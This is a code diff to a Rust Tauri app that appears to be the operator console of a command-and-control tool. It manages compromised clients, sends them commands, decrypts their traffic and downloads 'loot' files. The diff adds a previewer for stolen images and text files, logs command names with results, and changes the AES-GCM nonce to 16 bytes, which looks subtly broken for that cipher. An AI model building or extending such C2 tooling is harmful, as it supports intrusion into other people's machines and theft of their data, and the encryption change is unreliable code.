@@ -37,8 +37,8 @@ pub struct CommandLog {
 use rsa::{RsaPrivateKey, RsaPublicKey, Oaep};
 use rsa::pkcs1::{DecodeRsaPrivateKey, EncodeRsaPrivateKey};
 use rsa::pkcs8::EncodePublicKey;
-use aes_gcm::{Aes256Gcm, Key, Nonce, AeadCore};
-use aes_gcm::aead::{Aead, KeyInit, OsRng};
+use aes_gcm::{Aes256Gcm, Key, Nonce};
+use aes_gcm::aead::{Aead, KeyInit};
 use sha2::Sha256;
 use std::fs;
 use std::path::Path;
@@ -103,16 +103,20 @@ fn decrypt_aes(raw_b64: &str, aes_key: &[u8]) -> Option<String> {
 fn encrypt_aes(json_str: &str, aes_key: &[u8]) -> String {
     let key = Key::<Aes256Gcm>::from_slice(aes_key);
     let cipher = Aes256Gcm::new(key);
-    let generated_nonce = Aes256Gcm::generate_nonce(&mut OsRng);
+    // Use 16-byte nonce to match Python convention (os.urandom(16))
+    let mut nonce_bytes = [0u8; 16];
+    use rand::RngCore;
+    rand::thread_rng().fill_bytes(&mut nonce_bytes);
+    let nonce = Nonce::from_slice(&nonce_bytes);
     
-    if let Ok(encrypted_tag) = cipher.encrypt(&generated_nonce, json_str.as_bytes()) {
+    if let Ok(encrypted_tag) = cipher.encrypt(nonce, json_str.as_bytes()) {
         // encrypted_tag contains ciphertext + tag (16 bytes at end)
         let cipher_len = encrypted_tag.len() - 16;
         let ciphertext = &encrypted_tag[0..cipher_len];
         let tag = &encrypted_tag[cipher_len..];
         
         let mut payload = Vec::new();
-        payload.extend_from_slice(generated_nonce.as_slice());
+        payload.extend_from_slice(&nonce_bytes);
         payload.extend_from_slice(tag);
         payload.extend_from_slice(ciphertext);
         return general_purpose::STANDARD.encode(payload);
@@ -233,6 +237,144 @@ fn get_loot() -> Vec<LootFile> {
 fn get_loot_file(path: String) -> Result<String, String> {
     let content = std::fs::read(path).map_err(|e| e.to_string())?;
     Ok(general_purpose::STANDARD.encode(content))
+}
+
+#[derive(Serialize, Deserialize, Clone, Debug)]
+pub struct PreviewData {
+    pub status: String,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub r#type: Option<String>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub name: Option<String>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub path: Option<String>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub mime: Option<String>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub data: Option<String>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub content: Option<String>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub size: Option<String>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub message: Option<String>,
+}
+
+#[tauri::command]
+fn preview_file(path: String) -> PreviewData {
+    let p = Path::new(&path);
+    if !p.exists() {
+        return PreviewData {
+            status: "error".to_string(),
+            r#type: None,
+            name: Some(p.file_name().unwrap_or_default().to_string_lossy().to_string()),
+            path: Some(path),
+            mime: None,
+            data: None,
+            content: None,
+            size: None,
+            message: Some("File not found".to_string()),
+        };
+    }
+
+    let name = p.file_name().unwrap_or_default().to_string_lossy().to_string();
+    let ext = p.extension().unwrap_or_default().to_string_lossy().to_lowercase();
+
+    let image_exts = ["png", "jpg", "jpeg", "gif", "bmp", "webp", "ico"];
+    let text_exts = ["txt", "log", "json", "xml", "yaml", "yml", "md", "ini", "cfg", "conf", "bat", "ps1", "sh", "py", "js", "ts", "html", "css", "csv", "toml"];
+
+    if image_exts.contains(&ext.as_str()) {
+        match std::fs::read(p) {
+            Ok(bytes) => {
+                let mime = match ext.as_str() {
+                    "jpg" | "jpeg" => "image/jpeg",
+                    "gif" => "image/gif",
+                    "bmp" => "image/bmp",
+                    "webp" => "image/webp",
+                    "ico" => "image/x-icon",
+                    _ => "image/png",
+                };
+                let meta = std::fs::metadata(p).ok();
+                PreviewData {
+                    status: "ok".to_string(),
+                    r#type: Some("image".to_string()),
+                    name: Some(name),
+                    path: Some(path),
+                    mime: Some(mime.to_string()),
+                    data: Some(general_purpose::STANDARD.encode(bytes)),
+                    content: None,
+                    size: meta.map(|m| format!("{} bytes", m.len())),
+                    message: None,
+                }
+            }
+            Err(e) => PreviewData {
+                status: "error".to_string(),
+                r#type: None,
+                name: Some(name),
+                path: Some(path),
+                mime: None,
+                data: None,
+                content: None,
+                size: None,
+                message: Some(format!("Failed to read image: {}", e)),
+            },
+        }
+    } else if text_exts.contains(&ext.as_str()) {
+        match std::fs::read_to_string(p) {
+            Ok(text) => {
+                let meta = std::fs::metadata(p).ok();
+                let size_bytes = meta.as_ref().map(|m| m.len()).unwrap_or(0);
+                if size_bytes > 1_048_576 {
+                    return PreviewData {
+                        status: "error".to_string(),
+                        r#type: None,
+                        name: Some(name),
+                        path: Some(path),
+                        mime: None,
+                        data: None,
+                        content: None,
+                        size: None,
+                        message: Some("File too large for preview (>1MB)".to_string()),
+                    };
+                }
+                PreviewData {
+                    status: "ok".to_string(),
+                    r#type: Some("text".to_string()),
+                    name: Some(name),
+                    path: Some(path),
+                    mime: Some("text/plain".to_string()),
+                    data: None,
+                    content: Some(text),
+                    size: meta.map(|m| format!("{} bytes", m.len())),
+                    message: None,
+                }
+            }
+            Err(e) => PreviewData {
+                status: "error".to_string(),
+                r#type: None,
+                name: Some(name),
+                path: Some(path),
+                mime: None,
+                data: None,
+                content: None,
+                size: None,
+                message: Some(format!("Failed to read file: {}", e)),
+            },
+        }
+    } else {
+        let meta = std::fs::metadata(p).ok();
+        PreviewData {
+            status: "unsupported".to_string(),
+            r#type: None,
+            name: Some(name),
+            path: Some(path),
+            mime: None,
+            data: None,
+            content: None,
+            size: meta.map(|m| format!("{} bytes", m.len())),
+            message: Some("Preview not available for this file type".to_string()),
+        }
+    }
 }
 
 #[tauri::command]
@@ -420,6 +562,7 @@ pub fn run() {
                         let raw_id = data["client_id"].as_str().unwrap_or("unknown");
                         let client_id = clean_client_id(raw_id, &client_ip, pid);
                         let output = data["output"].as_str().unwrap_or("").to_string();
+                        let command_name = data["command"].as_str().unwrap_or("Result").to_string();
                         let mut logs = state_for_thread.logs.lock().unwrap();
                         
                         // Check if this is telemetry data
@@ -446,7 +589,7 @@ pub fn run() {
                             logs.push(CommandLog {
                                 id: new_id,
                                 client_id,
-                                command: "Result".to_string(),
+                                command: command_name,
                                 output,
                                 timestamp: Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
                                 status: "SUCCESS".to_string(),
@@ -491,7 +634,7 @@ pub fn run() {
     tauri::Builder::default()
         .manage(app_state)
         .plugin(tauri_plugin_opener::init())
-        .invoke_handler(tauri::generate_handler![get_clients, get_logs, send_command, get_loot, get_loot_file])
+        .invoke_handler(tauri::generate_handler![get_clients, get_logs, send_command, get_loot, get_loot_file, preview_file])
         .run(tauri::generate_context!())
         .expect("error while running tauri application");
 }
